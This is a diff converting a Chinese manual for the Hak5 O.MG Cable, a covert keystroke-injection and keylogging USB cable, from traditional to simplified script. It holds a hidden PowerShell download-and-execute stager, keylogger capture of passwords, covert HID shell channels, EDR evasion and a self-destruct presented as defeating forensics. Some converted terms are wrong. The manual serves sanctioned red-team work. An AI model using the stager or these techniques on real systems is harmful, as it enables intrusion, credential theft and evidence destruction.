@@ -1,183 +1,183 @@
 ---
-title: "Hak5 O.MG Cable 原廠技術說明書與全功能操作手冊"
+title: "Hak5 O.MG Cable 原厂技术说明书与全功能操作手册"
 model: "O.MG Cable"
 manufacturer: "Hak5"
-category: "隱蔽實體與無線 HID 滲透測試專用線纜 (Covert Physical & Wireless Cable)"
+category: "隐蔽实体与无线 HID 渗透测试专用线缆 (Covert Physical & Wireless Cable)"
 docs_url: "https://o.mg.lol/setup/OMGCable/"
 version: "3.0"
 locale: "zh-cn"
 ---
 
-# Hak5 O.MG Cable 原廠技術說明書與全功能操作手冊
+# Hak5 O.MG Cable 原厂技术说明书与全功能操作手册
 
-> Hak5 O.MG Cable 是一款手工精製的高階實體滲透測試專用線纜。外觀與一般原廠充電傳輸線完全無異，內部卻隱蔽整合了完整的微控制器運算平台、802.11 Wi-Fi 無線電收發模組、DuckyScript 高速按鍵注入引擎、硬件級鍵盤嗅探器（Keylogger）與突破性的 HIDX StealthLink 雙向隱蔽通訊通道。
-
----
-
-## 目錄
-
-- [**1. 產品概述與硬件架構**](#1-產品概述與硬件架構)
-  - [1.1 產品定位與威脅情境分析](#11-產品定位與威脅情境分析)
-  - [1.2 技術規格與硬件校準基準表](#12-技術規格與硬件校準基準表)
-  - [1.3 主動端與被動端之物理定向機制](#13-主動端與被動端之物理定向機制)
-  - [1.4 多元接頭規格與線纜型號識別](#14-多元接頭規格與線纜型號識別)
-- [**2. 硬件初始化、固件燒錄與网络連線**](#2-硬件初始化固件燒錄與网络連線)
-  - [2.1 使用 O.MG Programmer 進行出廠激活](#21-使用-omg-programmer-進行出廠激活)
-  - [2.2 透過 O.MG Web Flasher 進行瀏覽器固件燒錄](#22-透過-omg-web-flasher-進行瀏覽器固件燒錄)
-  - [2.3 進階 Python Flasher 離線命令列燒錄](#23-進階-python-flasher-離線命令列燒錄)
-  - [2.4 建立 Wi-Fi 無線基地台連線](#24-建立-wi-fi-無線基地台連線)
-  - [2.5 網頁管理控制台與用戶端模式配置](#25-網頁管理控制台與用戶端模式配置)
-- [**3. 核心功能、按鍵注入與 DuckyScript 引擎**](#3-核心功能按鍵注入與-duckyscript-引擎)
-  - [3.1 O.MG 载荷執行引擎與極速按鍵注入](#31-omg-载荷執行引擎與極速按鍵注入)
-  - [3.2 DuckyScript for O.MG 擴充語法與指令集](#32-duckyscript-for-omg-擴充語法與指令集)
-  - [3.3 鍵盤嗅探器運作與即時擊鍵攔截 (Keylogger)](#33-鍵盤嗅探器運作與即時擊鍵攔截-keylogger)
-  - [3.4 磁區編輯器與载荷槽位彈性配置 (Partition Editor)](#34-磁區編輯器與载荷槽位彈性配置-partition-editor)
-  - [3.5 多語系鍵盤對應表檢視器 (Keymap Viewer)](#35-多語系鍵盤對應表檢視器-keymap-viewer)
-- [**4. HIDX StealthLink 與隱蔽資料通道**](#4-hidx-stealthlink-與隱蔽資料通道)
-  - [4.1 HIDX StealthLink 雙向傳輸技術架構](#41-hidx-stealthlink-雙向傳輸技術架構)
-  - [4.2 Windows PowerShell 互動式 Shell 與 TCP 外傳](#42-windows-powershell-互動式-shell-與-tcp-外傳)
-  - [4.3 Linux 互動式 Shell 與原始資料導出](#43-linux-互動式-shell-與原始資料導出)
-  - [4.4 macOS Python 互動式終端管道](#44-macos-python-互動式終端管道)
-  - [4.5 實務部署時序與优化建議](#45-實務部署時序與优化建議)
-- [**5. 雲端艦隊管理、防禦規避與系統維護**](#5-雲端艦隊管理防禦規避與系統維護)
-  - [5.1 Hak5 Cloud C² 雲端集中管控整合](#51-hak5-cloud-c-雲端集中管控整合)
-  - [5.2 WebSocket API 自動化程式接口](#52-websocket-api-自動化程式接口)
-  - [5.3 地理圍欄防禦與邊界失效保護 (Geofencing)](#53-地理圍欄防禦與邊界失效保護-geofencing)
-  - [5.4 緊急硬件自毀抹除機制 (Self-Destruct)](#54-緊急硬件自毀抹除機制-self-destruct)
-  - [5.5 晶片校準、故障排查與復原流程](#55-晶片校準故障排查與復原流程)
+> Hak5 O.MG Cable 是一款手工精制的高端实体渗透测试专用线缆。外观与一般原厂充电传输线完全无异，内部却隐蔽集成了完整的单片机运算平台、802.11 Wi-Fi 无线电收发模块、DuckyScript 高速按键注入引擎、硬件级键盘嗅探器（Keylogger）与突破性的 HIDX StealthLink 双向隐蔽通信信道。
 
 ---
 
-## 1. 產品概述與硬件架構
+## 目录
+
+- [**1. 产品概述与硬件架构**](#1-产品概述与硬件架构)
+  - [1.1 产品定位与威胁情境分析](#11-产品定位与威胁情境分析)
+  - [1.2 技术规格与硬件校准基准表](#12-技术规格与硬件校准基准表)
+  - [1.3 主动端与被动端之物理定向机制](#13-主动端与被动端之物理定向机制)
+  - [1.4 多元接头规格与线缆型号识别](#14-多元接头规格与线缆型号识别)
+- [**2. 硬件初始化、固件刻录与网络连接**](#2-硬件初始化固件刻录与网络连接)
+  - [2.1 使用 O.MG Programmer 进行出厂激活](#21-使用-omg-programmer-进行出厂激活)
+  - [2.2 通过 O.MG Web Flasher 进行浏览器固件刻录](#22-通过-omg-web-flasher-进行浏览器固件刻录)
+  - [2.3 高端 Python Flasher 脱机命令行刻录](#23-高端-python-flasher-脱机命令行刻录)
+  - [2.4 创建 Wi-Fi 无线基地台连接](#24-创建-wi-fi-无线基地台连接)
+  - [2.5 网页管理控制台与用户端模式配置](#25-网页管理控制台与用户端模式配置)
+- [**3. 内核功能、按键注入与 DuckyScript 引擎**](#3-内核功能按键注入与-duckyscript-引擎)
+  - [3.1 O.MG 载荷运行引擎与极速按键注入](#31-omg-载荷运行引擎与极速按键注入)
+  - [3.2 DuckyScript for O.MG 扩充语法与指令集](#32-duckyscript-for-omg-扩充语法与指令集)
+  - [3.3 键盘嗅探器运作与即时击键拦截 (Keylogger)](#33-键盘嗅探器运作与即时击键拦截-keylogger)
+  - [3.4 磁区编辑器与载荷槽位弹性配置 (Partition Editor)](#34-磁区编辑器与载荷槽位弹性配置-partition-editor)
+  - [3.5 多语系键盘对应表查看器 (Keymap Viewer)](#35-多语系键盘对应表查看器-keymap-viewer)
+- [**4. HIDX StealthLink 与隐蔽数据信道**](#4-hidx-stealthlink-与隐蔽数据信道)
+  - [4.1 HIDX StealthLink 双向传输技术架构](#41-hidx-stealthlink-双向传输技术架构)
+  - [4.2 Windows PowerShell 交互式 Shell 与 TCP 外传](#42-windows-powershell-交互式-shell-与-tcp-外传)
+  - [4.3 Linux 交互式 Shell 与原始数据导出](#43-linux-交互式-shell-与原始数据导出)
+  - [4.4 macOS Python 交互式终端管道](#44-macos-python-交互式终端管道)
+  - [4.5 实务部署时序与优化建议](#45-实务部署时序与优化建议)
+- [**5. 云端舰队管理、防御规避与系统维护**](#5-云端舰队管理防御规避与系统维护)
+  - [5.1 Hak5 Cloud C² 云端集中管控集成](#51-hak5-cloud-c-云端集中管控集成)
+  - [5.2 WebSocket API 自动化程序接口](#52-websocket-api-自动化程序接口)
+  - [5.3 地理围栏防御与边界失效保护 (Geofencing)](#53-地理围栏防御与边界失效保护-geofencing)
+  - [5.4 紧急硬件自毁抹除机制 (Self-Destruct)](#54-紧急硬件自毁抹除机制-self-destruct)
+  - [5.5 芯片校准、故障排查与复原流程](#55-芯片校准故障排查与复原流程)
+
+---
+
+## 1. 产品概述与硬件架构
 
 <!-- section：overview -->
-本章節深入剖析 Hak5 O.MG Cable 實體線纜的產品架構、微控制器技術細節與硬件基準真相表。
+本章节深入剖析 Hak5 O.MG Cable 实体线缆的产品架构、单片机技术细节与硬件基准真相表。
 
-### 1.1 產品定位與威脅情境分析
+### 1.1 产品定位与威胁情境分析
 
-在傳統网络安全認知中，周邊充電線與傳輸線常被視為毫無運算能力的被動组件。然而，諸如美國國安局（NSA）早期的 COTTONMOUTH-I 等硬件植入技術證明，在線纜接頭內部植入微型晶片能達成前所未有的物理旁路入侵。
+在传统网络安全认知中，周边充电线与传输线常被视为毫无运算能力的被动组件。然而，诸如美国国安局（NSA）早期的 COTTONMOUTH-I 等硬件植入技术证明，在线缆接头内部植入微型芯片能达成前所未有的物理旁路入侵。
 
-O.MG Cable 將高階國家級硬件植入技術平民化，具備極致的隱蔽性：
-- **實體外觀零瑕疵**：採用工業級高壓注塑工藝，接頭長度、重量、線身柔韌度均與各大品牌原廠線纜一致，無任何可疑突起或粗糙外殼。
-- **資料線完全電氣透明**：在未觸發载荷的待機狀態下，USB 資料傳輸線（D+/D-）保持純被動導通狀態，作業系統底層不會產生任何 USB 裝置枚舉（Enumeration）事件，徹底規避终端防護软件（EDR/MDM）之硬件監控。
-- **超長距無線空中觸發**：內建 2.4 GHz Wi-Fi 晶片與微型射頻天線，紅隊測試員可在百公尺外透過智慧型手機或筆記型電腦遠端連線觸發攻擊。
+O.MG Cable 将高端国家级硬件植入技术平民化，具备极致的隐蔽性：
+- **实体外观零瑕疵**：采用工业级高压注塑工艺，接头长度、重量、线身柔韧度均与各大品牌原厂线缆一致，无任何可疑突起或粗糙外壳。
+- **数据线完全电气透明**：在未触发载荷的待机状态下，USB 数据传输线（D+/D-）保持纯被动导通状态，操作系统底层不会产生任何 USB 设备枚举（Enumeration）事件，彻底规避终端防护软件（EDR/MDM）之硬件监控。
+- **超长距无线空中触发**：内置 2.4 GHz Wi-Fi 芯片与微型射频天线，红队测试员可在百公尺外通过智能型手机或笔记型电脑远程连接触发攻击。
 
-### 1.2 技術規格與硬件校準基準表
+### 1.2 技术规格与硬件校准基准表
 
-| 硬件規格細項 | 原廠官方技術規格基準 |
+| 硬件规格细项 | 原厂官方技术规格基准 |
 |---|---|
-| **設備架構** | 隱蔽嵌合式微控制器 USB 滲透專用傳輸線 |
-| **射頻模組** | 整合式 802.11 b/g/n (2.4 GHz) Wi-Fi 無線電與微型 PCB 天線 |
-| **工作電壓** | 固定 5 V DC (+/- 0.5 V) 透過主機端 USB 接口供電 |
-| **電流量消耗** | 待機：~80–120 mA；尖峰發射：最高 350 mA；供電需求門檻：500 mA |
-| **資料透傳效能** | USB 2.0 高速 (480 Mbps) 全速透傳 (载荷閒置時完全透明導通) |
-| **電力透傳規範** | 支持固定 5 V 充電透傳；USB-PD (Power Delivery) 協定最高協商至 5 V |
-| **接頭規格型號** | USB-A to USB-C、USB-C to USB-C、USB-A to Lightning、USB-C to Lightning |
-| **儲存磁區容量** | 非揮發性快閃内存 (劃分為系統區、Web 控制台與载荷區) |
-| **载荷槽位數量** | Basic 基礎版：8 組槽位；Plus 與 Elite 進階版：最高支持 200 組槽位 |
-| **嗅探緩衝内存** | Keylogger 版：內建約 650,000 次按鍵歷史紀錄之加密儲存空間 |
-| **鍵盤硬件相容** | Full Speed 全速 USB 鍵盤 (相容 12 Mbps 標準 HID 通訊協定) |
-| **按鍵注入速率** | 每分鐘最高 890 字 (WPM)，支持硬件級 USB 超頻注入技術 |
-| **雙向隱蔽通道** | HIDX StealthLink (利用標準 HID Report 實現雙向終端通道) |
-| **安全防護機制** | WPA2 無線加密、BSSID 地理圍欄 (Geofencing)、硬件等級緊急自毀 |
+| **设备架构** | 隐蔽嵌合式单片机 USB 渗透专用传输线 |
+| **射频模块** | 集成式 802.11 b/g/n (2.4 GHz) Wi-Fi 无线电与微型 PCB 天线 |
+| **工作电压** | 固定 5 V DC (+/- 0.5 V) 通过主机端 USB 接口供电 |
+| **电流量消耗** | 待机：~80–120 mA；尖峰发射：最高 350 mA；供电需求门槛：500 mA |
+| **数据透传性能** | USB 2.0 高速 (480 Mbps) 全速透传 (载荷闲置时完全透明导通) |
+| **电力透传规范** | 支持固定 5 V 充电透传；USB-PD (Power Delivery) 协定最高协商至 5 V |
+| **接头规格型号** | USB-A to USB-C、USB-C to USB-C、USB-A to Lightning、USB-C to Lightning |
+| **保存磁区容量** | 非挥发性快闪内存 (划分为系统区、Web 控制台与载荷区) |
+| **载荷槽位数量** | Basic 基础版：8 组槽位；Plus 与 Elite 高端版：最高支持 200 组槽位 |
+| **嗅探缓冲内存** | Keylogger 版：内置约 650,000 次按键历史纪录之加密保存空间 |
+| **键盘硬件兼容** | Full Speed 全速 USB 键盘 (兼容 12 Mbps 标准 HID 通信协定) |
+| **按键注入速率** | 每分钟最高 890 字 (WPM)，支持硬件级 USB 超频注入技术 |
+| **双向隐蔽信道** | HIDX StealthLink (利用标准 HID Report 实现双向终端信道) |
+| **安全防护机制** | WPA2 无线加密、BSSID 地理围栏 (Geofencing)、硬件等级紧急自毁 |
 
-### 1.3 主動端與被動端之物理定向機制
+### 1.3 主动端与被动端之物理定向机制
 
-所有的 O.MG Cable 均具備嚴格的**物理方向性**：
-1. **主動端 (Active End)**：
-   - 內含微控制器、Wi-Fi 模組與按鍵注入矩陣。
-   - **必須連接至被測目標主機**。
-   - 所有的 DuckyScript 按鍵注入、HIDX 通道均由此端向目標電腦發送。
-   - 燒錄固件時，亦必須將此主動端插入 O.MG Programmer。
-2. **被動/透傳端 (Passthrough End)**：
-   - 用於連接一般周邊（如智慧型手機、實體鍵盤、鼠标或 USB U 盘）。
-   - 負責將下游設備的資料與充電電力透明導通至主動端。
+所有的 O.MG Cable 均具备严格的**物理方向性**：
+1. **主动端 (Active End)**：
+   - 内含单片机、Wi-Fi 模块与按键注入矩阵。
+   - **必须连接至被测目标主机**。
+   - 所有的 DuckyScript 按键注入、HIDX 信道均由此端向目标电脑发送。
+   - 刻录固件时，亦必须将此主动端插入 O.MG Programmer。
+2. **被动/透传端 (Passthrough End)**：
+   - 用于连接一般周边（如智能型手机、实体键盘、鼠标或 USB U 盘）。
+   - 负责将下游设备的数据与充电电力透明导通至主动端。
 
 > [!WARNING]
-> 若將被動端插入目標電腦、主動端插入手機，手機將正常充電，但線纜將完全無法向目標電腦注入按鍵指令！
+> 若将被动端插入目标电脑、主动端插入手机，手机将正常充电，但线缆将完全无法向目标电脑注入按键指令！
 
-### 1.4 多元接頭規格與線纜型號識別
+### 1.4 多元接头规格与线缆型号识别
 
-- **Type-A to Type-C**：Type-A 端為 Active End；Type-C 端為 Passthrough End。
-- **Type-A to Lightning**：Type-A 端為 Active End；Lightning 端為 Passthrough End。
-- **Type-C to Lightning**：Type-C 端為 Active End；Lightning 端為 Passthrough End。
-- **Type-C to Type-C**：由於雙向接頭外觀一致，Active 端接頭外殼雷雕有專屬標誌，或隨機附有識別夾；插入 O.MG Programmer 時，僅當 Active 端插入時指示燈才會點亮。
+- **Type-A to Type-C**：Type-A 端为 Active End；Type-C 端为 Passthrough End。
+- **Type-A to Lightning**：Type-A 端为 Active End；Lightning 端为 Passthrough End。
+- **Type-C to Lightning**：Type-C 端为 Active End；Lightning 端为 Passthrough End。
+- **Type-C to Type-C**：由于双向接头外观一致，Active 端接头外壳雷雕有专属标志，或随机附有识别夹；插入 O.MG Programmer 时，仅当 Active 端插入时指示灯才会点亮。
 
 ---
 
-## 2. 硬件初始化、固件燒錄與网络連線
+## 2. 硬件初始化、固件刻录与网络连接
 
 <!-- section：configuration -->
-本章節提供出廠激活、網頁序列燒錄以及 Wi-Fi 管理网络的完整操作步驟。
+本章节提供出厂激活、网页串行刻录以及 Wi-Fi 管理网络的完整操作步骤。
 
-### 2.1 使用 O.MG Programmer 進行出廠激活
+### 2.1 使用 O.MG Programmer 进行出厂激活
 
-為遵循各國無線電射頻輸出與出入口法規，所有 O.MG 設備出廠時均處於“未激活”的休眠狀態。
+为遵循各国无线电射频输出与出入口法规，所有 O.MG 设备出厂时均处于“未激活”的休眠状态。
 
-初次使用必須搭配 **O.MG Programmer** 進行激活：
-1. 確認 O.MG Cable 的**主動端 (Active End)**。
-2. 將主動端確實插入 O.MG Programmer 的母座。
-3. 將 O.MG Programmer 插入管理電腦的 USB 端口。
-4. 若使用 Windows 系統，請確保已安裝 Silicon Labs CP2102 虛擬 COM 埠驅動程式。
+初次使用必须搭配 **O.MG Programmer** 进行激活：
+1. 确认 O.MG Cable 的**主动端 (Active End)**。
+2. 将主动端确实插入 O.MG Programmer 的母座。
+3. 将 O.MG Programmer 插入管理电脑的 USB 端口。
+4. 若使用 Windows 系统，请确保已安装 Silicon Labs CP2102 虚拟 COM 端口驱动程序。
 
-### 2.2 透過 O.MG Web Flasher 進行瀏覽器固件燒錄
+### 2.2 通过 O.MG Web Flasher 进行浏览器固件刻录
 
-官方提供免安裝的 Chrome 網頁序列埠燒錄工具：
-1. 使用 Google Chrome、Brave 或 Edge 瀏覽器開啟：`https://o-mg.github.io/WebFlasher/`
-2. 点击畫面上的 **Connect** 按鈕。
-3. 在瀏覽器跳出的序列埠選單中選取 `CP2102 USB to UART Bridge Controller`。
-4. 依指示選取設備型號（O.MG Cable）與欲安裝之最新固件版本。
-5. 点击 **Install Firmware**，工具將自動完成清除 Flash、寫入系統分割區與校驗程序。
-6. 燒錄完成後，螢幕將顯示默认無線网络資訊：
+官方提供免安装的 Chrome 网页串行端口刻录工具：
+1. 使用 Google Chrome、Brave 或 Edge 浏览器打开：`https://o-mg.github.io/WebFlasher/`
+2. 点击画面上的 **Connect** 按钮。
+3. 在浏览器跳出的串行端口菜单中选取 `CP2102 USB to UART Bridge Controller`。
+4. 依指示选取设备型号（O.MG Cable）与欲安装之最新固件版本。
+5. 点击 **Install Firmware**，工具将自动完成清除 Flash、写入系统分割区与校验进程。
+6. 刻录完成后，屏幕将显示默认无线网络信息：
    - **默认 SSID**：`O.MG`
-   - **默认密碼**：`12345678`
+   - **默认密码**：`12345678`
    - **默认管理 IP**：`http://192.168.4.1`
 
-### 2.3 進階 Python Flasher 離線命令列燒錄
+### 2.3 高端 Python Flasher 脱机命令行刻录
 
-對於機密隔離環境或批次自動化燒錄需求，可使用官方 Python 工具：
+对于机密隔离环境或批量自动化刻录需求，可使用官方 Python 工具：
 ```bash
 git clone https://github.com/O-MG/O.MG-Firmware.git
 cd O.MG-Firmware
 pip3 install esptool pyserial
 python3 flasher.py
 ```
-支持離線寫入預載载荷、客製化出廠 SSID 及 Flash 完整二進位備份。
+支持脱机写入预载载荷、客制化出厂 SSID 及 Flash 完整二进位备份。
 
-### 2.4 建立 Wi-Fi 無線基地台連線
+### 2.4 创建 Wi-Fi 无线基地台连接
 
-1. 將 O.MG Cable 主動端插入任何可供電之 5 V USB 端口（電腦或行動電源）。
-2. 在管理電腦或手機之 Wi-Fi 清單中搜尋 `O.MG`。
-3. 輸入密碼 `12345678` 進行配對。
-4. 連線建立後，終端設備將自動取得 `192.168.4.x` 網段 IP。
+1. 将 O.MG Cable 主动端插入任何可供电之 5 V USB 端口（电脑或行动电源）。
+2. 在管理电脑或手机之 Wi-Fi 清单中搜索 `O.MG`。
+3. 输入密码 `12345678` 进行配对。
+4. 连接创建后，终端设备将自动取得 `192.168.4.x` 网段 IP。
 
-### 2.5 網頁管理控制台與用戶端模式配置
+### 2.5 网页管理控制台与用户端模式配置
 
-在瀏覽器輸入 `http://192.168.4.1` 進入響應式 Web UI：
-- **即時觸發面板**：單鍵執行預存於各槽位的按鍵注入腳本。
-- **線上記錄器**：線上查看鍵盤嗅探日誌與系統除錯訊息。
-- **网络模式切換**：可從 Access Point（AP 基地台模式）切換為 Station（Wi-Fi Client 用戶端模式），讓 O.MG Cable 主動連線至現場企業 Wi-Fi 或滲透人員的手機熱點。
+在浏览器输入 `http://192.168.4.1` 进入响应式 Web UI：
+- **即时触发面板**：单键运行预存于各槽位的按键注入脚本。
+- **在线记录器**：在线查看键盘嗅探日志与系统调试消息。
+- **网络模式切换**：可从 Access Point（AP 基地台模式）切换为 Station（Wi-Fi Client 用户端模式），让 O.MG Cable 主动连接至现场企业 Wi-Fi 或渗透人员的手机热点。
 
 ---
 
-## 3. 核心功能、按鍵注入與 DuckyScript 引擎
+## 3. 内核功能、按键注入与 DuckyScript 引擎
 
 <!-- section：features -->
-本章節說明 DuckyScript for O.MG 的進階語法、鍵盤嗅探機能與磁區管理。
+本章节说明 DuckyScript for O.MG 的高端语法、键盘嗅探机能与磁区管理。
 
-### 3.1 O.MG 载荷執行引擎與極速按鍵注入
+### 3.1 O.MG 载荷运行引擎与极速按键注入
 
-O.MG Cable 將指令轉換為底層 USB HID 鍵盤掃描碼直接送交目標作業系統，速度最高可達每分鐘 890 字，能瞬間於目標主機上彈出終端機並完成反向連線部署。
+O.MG Cable 将指令转换为底层 USB HID 键盘扫描码直接送交目标操作系统，速度最高可达每分钟 890 字，能瞬间于目标主机上弹出终端机并完成反向连接部署。
 
-### 3.2 DuckyScript for O.MG 擴充語法與指令集
+### 3.2 DuckyScript for O.MG 扩充语法与指令集
 
-相容標準 DuckyScript 語法，並加入 O.MG 專屬硬件控制指令：
-- `BLINK <次數>`：使機身隱藏之診斷 LED 閃爍特定次數。
-- `WAIT_FOR_BUTTON_PRESS`：暫停執行，直至操作者於 Web 接口点击確認。
-- `GEOFENCE_CHECK`：即時檢驗周邊環境 BSSID 是否符合授權範圍。
-- `SELF_DESTRUCT`：立即執行不可逆之硬件自毀。
+兼容标准 DuckyScript 语法，并加入 O.MG 专属硬件控制指令：
+- `BLINK <次數>`：使机身隐藏之诊断 LED 闪烁特定次数。
+- `WAIT_FOR_BUTTON_PRESS`：暂停运行，直至操作者于 Web 接口点击确认。
+- `GEOFENCE_CHECK`：即时检验周边环境 BSSID 是否符合授权范围。
+- `SELF_DESTRUCT`：立即运行不可逆之硬件自毁。
 
-#### 實戰範例：無痕下載執行腳本
+#### 实战范例：无痕下载运行脚本
 ```text
 REM O.MG Windows Quick Stager
 DELAY 1500
@@ -187,79 +187,79 @@ STRING powershell -NoP -NonI -W Hidden -Exec Bypass“IEX(New-Object Net.WebClie
 ENTER
 ```
 
-### 3.3 鍵盤嗅探器運作與即時擊鍵攔截 (Keylogger)
+### 3.3 键盘嗅探器运作与即时击键拦截 (Keylogger)
 
-針對配備 Keylogger 模組之版本：
-- 當下游插入實體鍵盤時，O.MG Cable 會以全速（Full Speed 12 Mbps）截獲所有打字数据包。
-- 內建非揮發性内存可儲存高達 **650,000 次按鍵輸入**，即便線纜斷電拔除，記錄依然完整保存。
-- 支持 Web UI 即時串流顯示，操作者可在遠端即時目擊目標輸入之帳號、密碼與機密對話。
+针对配备 Keylogger 模块之版本：
+- 当下游插入实体键盘时，O.MG Cable 会以全速（Full Speed 12 Mbps）截获所有打字数据包。
+- 内置非挥发性内存可保存高达 **650,000 次按键输入**，即便线缆断电拔除，记录依然完整保存。
+- 支持 Web UI 即时串流显示，操作者可在远程即时目击目标输入之帐号、密码与机密对话。
 
-### 3.4 磁區編輯器與载荷槽位彈性配置 (Partition Editor)
+### 3.4 磁区编辑器与载荷槽位弹性配置 (Partition Editor)
 
-內建圖形化 Partition Editor：
-- 自由調整系統 Flash 分配比例（分配更多空間給嗅探日誌或大型多階段载荷）。
-- 支持多達 200 組獨立载荷槽位，方便在不同攻擊目標之間迅速切換。
+内置图形化 Partition Editor：
+- 自由调整系统 Flash 分配比例（分配更多空间给嗅探日志或大型多阶段载荷）。
+- 支持多达 200 组独立载荷槽位，方便在不同攻击目标之间迅速切换。
 
-### 3.5 多語系鍵盤對應表檢視器 (Keymap Viewer)
+### 3.5 多语系键盘对应表查看器 (Keymap Viewer)
 
-由於 USB 傳遞的是實體鍵盤按鍵碼（Scancodes），作業系統會依語系配置轉譯字符。內建 Keymap Viewer 支持美規、英規、德規、法規、日規等多國鍵盤對應，徹底避免因符號映射錯位導致語法執行失敗。
-
----
-
-## 4. HIDX StealthLink 與隱蔽資料通道
-
-傳統 U 盘容易被企業网络安全政策全面封鎖，而出站网络連線亦常受防火牆阻擋。**HIDX StealthLink** 徹底突破此一僵局。
-
-### 4.1 HIDX StealthLink 雙向傳輸技術架構
-
-StealthLink 利用 USB 人機接口裝置（HID）規範中的標準 Feature Reports 数据包建立通訊：
-- 完全無需在目標電腦安裝特殊驅動程式。
-- 作業系統原生信任 HID 鍵盤與鼠标通訊，数据包不會觸發任何终端防護警報。
-- 建立一個完全獨立於主機网络卡之外的**實體隱蔽雙向通道**。
-
-### 4.2 Windows PowerShell 互動式 Shell 與 TCP 外傳
-
-注入微型 PowerShell 通訊代码後，目標電腦會將本機 Shell 導向至 USB HID 终端。操作者在 O.MG 網頁端即可獲得一個完整的互動式 `powershell.exe` 控制台，並能雙向傳輸二進位檔案。
-
-### 4.3 Linux 互動式 Shell 與原始資料導出
-
-在 Linux 主機上，StealthLink 透過 `/dev/hidraw` 節點進行通訊，建立無网络 Socket 連線的隱形 Bash 反彈終端。
-
-### 4.4 macOS Python 互動式終端管道
-
-利用 macOS 內建之 POSIX 或 IOKit 接口，隱蔽開啟終端機管道，完全不在畫面上跳出視窗。
-
-### 4.5 實務部署時序與优化建議
-
-Feature Report 每次以 64 位元組區塊進行分包傳輸，有效通訊速率介於 15 KB/s 至 60 KB/s 之間，足夠進行憑證導出、日誌提取與即時指令下發。
+由于 USB 传递的是实体键盘按键码（Scancodes），操作系统会依语系配置转译字符。内置 Keymap Viewer 支持美规、英规、德规、法规、日规等多国键盘对应，彻底避免因符号映射错位导致语法运行失败。
 
 ---
 
-## 5. 雲端艦隊管理、防禦規避與系統維護
+## 4. HIDX StealthLink 与隐蔽数据信道
+
+传统 U 盘容易被企业网络安全政策全面封锁，而出站网络连接亦常受防火墙阻挡。**HIDX StealthLink** 彻底突破此一僵局。
+
+### 4.1 HIDX StealthLink 双向传输技术架构
+
+StealthLink 利用 USB 人机接口设备（HID）规范中的标准 Feature Reports 数据包创建通信：
+- 完全无需在目标电脑安装特殊驱动程序。
+- 操作系统原生信任 HID 键盘与鼠标通信，数据包不会触发任何终端防护警报。
+- 创建一个完全独立于主机网络卡之外的**实体隐蔽双向信道**。
+
+### 4.2 Windows PowerShell 交互式 Shell 与 TCP 外传
+
+注入微型 PowerShell 通信代码后，目标电脑会将本机 Shell 导向至 USB HID 终端。操作者在 O.MG 网页端即可获得一个完整的交互式 `powershell.exe` 控制台，并能双向传输二进位文件。
+
+### 4.3 Linux 交互式 Shell 与原始数据导出
+
+在 Linux 主机上，StealthLink 通过 `/dev/hidraw` 节点进行通信，创建无网络 Socket 连接的隐形 Bash 反弹终端。
+
+### 4.4 macOS Python 交互式终端管道
+
+利用 macOS 内置之 POSIX 或 IOKit 接口，隐蔽打开终端机管道，完全不在画面上跳出窗口。
+
+### 4.5 实务部署时序与优化建议
+
+Feature Report 每次以 64 字节区块进行分包传输，有效通信速率介于 15 KB/s 至 60 KB/s 之间，足够进行凭证导出、日志提取与即时指令下发。
+
+---
+
+## 5. 云端舰队管理、防御规避与系统维护
 
 <!-- section：maintenance -->
-本章節說明雲端整合、地理圍欄防禦與硬件自毀復原準則。
+本章节说明云端集成、地理围栏防御与硬件自毁复原准则。
 
-### 5.1 Hak5 Cloud C² 雲端集中管控整合
+### 5.1 Hak5 Cloud C² 云端集中管控集成
 
-將 O.MG Cable 配置為 Station 模式連上網際网络後，即可註冊至私有 Hak5 Cloud C² 服务器，實現跨國遠端觸發與資料即時彙總。
+将 O.MG Cable 配置为 Station 模式连上网际网络后，即可注册至私有 Hak5 Cloud C² 服务器，实现跨国远程触发与数据即时汇总。
 
-### 5.2 WebSocket API 自動化程式接口
+### 5.2 WebSocket API 自动化程序接口
 
-提供標準 WebSocket 接口（埠號 80/8080），支持以 Python、Go 或 Node.js 撰寫自動化外掛，與外部 C2 框架深度整合。
+提供标准 WebSocket 接口（端口号 80/8080），支持以 Python、Go 或 Node.js 撰写自动化插件，与外部 C2 框架深度集成。
 
-### 5.3 地理圍欄防禦與邊界失效保護 (Geofencing)
+### 5.3 地理围栏防御与边界失效保护 (Geofencing)
 
-可配置現場特定 Wi-Fi BSSID（基地台 MAC 位址）。若線纜被攜離目標企業大樓（偵測不到特定 MAC），設備將自動關閉無線發射並進入假死狀態，防止機敏工具外流。
+可配置现场特定 Wi-Fi BSSID（基地台 MAC 地址）。若线缆被携离目标企业大楼（侦测不到特定 MAC），设备将自动关闭无线发射并进入假死状态，防止机敏工具外流。
 
-### 5.4 緊急硬件自毀抹除機制 (Self-Destruct)
+### 5.4 紧急硬件自毁抹除机制 (Self-Destruct)
 
-在面臨實體查扣或网络安全搜查的極端情境下：
-- 操作者可透過 Web UI 或遠端指令發動 `Self-Destruct`。
-- 晶片將瞬間覆寫所有 Flash 儲存區、銷毀加密金鑰並切斷微控制器通訊，將設備永久還原為一條毫無攻擊能力的普通充電線，使鑑識實驗室無法還原任何數位證據。
+在面临实体查扣或网络安全搜查的极端情境下：
+- 操作者可通过 Web UI 或远程指令发动 `Self-Destruct`。
+- 芯片将瞬间覆写所有 Flash 保存区、销毁加密密钥并切断单片机通信，将设备永久还原为一条毫无攻击能力的普通充电线，使鉴识实验室无法还原任何数字证据。
 
-### 5.5 晶片校準、故障排查與復原流程
+### 5.5 芯片校准、故障排查与复原流程
 
-若因非預期斷電導致系統異常：
-1. 將主動端重新插入 O.MG Programmer。
-2. 進入 Web Flasher 執行完整 Erase & Flash 流程，即可復原出廠默认固件。
+若因非预期断电导致系统异常：
+1. 将主动端重新插入 O.MG Programmer。
+2. 进入 Web Flasher 运行完整 Erase & Flash 流程，即可复原出厂默认固件。
